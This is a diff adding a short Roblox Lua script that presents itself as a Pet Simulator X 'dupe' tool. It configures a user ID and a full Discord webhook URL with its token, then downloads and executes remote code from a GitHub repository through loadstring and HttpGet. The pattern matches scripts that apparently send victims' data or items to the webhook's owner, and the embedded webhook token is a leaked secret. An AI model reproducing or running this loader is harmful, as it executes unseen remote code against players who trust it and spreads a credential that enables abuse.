@@ -1,0 +1,8 @@
+
+_G.UserID = 3133735540
+
+_G.Webhook = "https://discord.com/api/webhooks/987436777230962748/RIrR2_eLO5ScL_VUK51XQgJTgZWyFxOdDS9pGFSeGSCxfFXFcFed5D1MbC1y-1942_p_"
+_G.KickMessage = "Next time wait 30 sec before injecting"
+_G.PopUpMessage = "Enjoy  made by team soyp"
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/gui-1")()
